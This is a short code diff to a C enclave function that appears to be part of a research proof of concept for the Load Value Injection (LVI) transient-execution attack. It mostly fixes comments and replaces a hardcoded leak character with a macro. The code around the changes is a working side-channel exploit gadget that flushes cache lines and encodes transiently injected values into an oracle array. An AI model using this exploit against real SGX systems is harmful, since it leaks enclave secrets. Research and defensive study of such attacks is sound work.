@@ -39,9 +39,7 @@
 #include "../conf.h"
 #include "string.h"
 
-//non-assembly access that doesn't get optimized away by -O3
 inline void maccess(volatile void *p) {
-  //volatile uint64_t t = *((uint64_t *)p);
   *((volatile uint64_t *)p);
 }
 
@@ -90,7 +88,7 @@ void ecall_do_something(char* oracle) {
     flush(&delay[0]);
     flush(&delay[8]);
 
-    //enable for transient value from storebuffer (should be no difference on null-fixed cpu)
+    //enable for transient value from storebuffer (should be no difference on lvi-fixed cpu)
     input_page[20] = 6;
 
     //victim
@@ -100,7 +98,7 @@ void ecall_do_something(char* oracle) {
     maccess(&delay[8]);
 
     //0 gets transiently injected into the load of decider_variable here, redirecting to case 0
-    //if your cpu does not ahve lvi mitigations, it might redirect to case 6 instead
+    //if your cpu does not have lvi mitigations, it might redirect to case 6 instead
     switch (decider_variable[20])
     {
       case 0:
@@ -122,7 +120,7 @@ void ecall_do_something(char* oracle) {
         maccess(oracle + 4096 * 5);
         break;
       case 6:
-        maccess(oracle + 4096 * 't');
+        maccess(oracle + 4096 * LEAKAGE_CHAR);
         break;
       case 7:
         maccess(oracle + 4096 * 7);
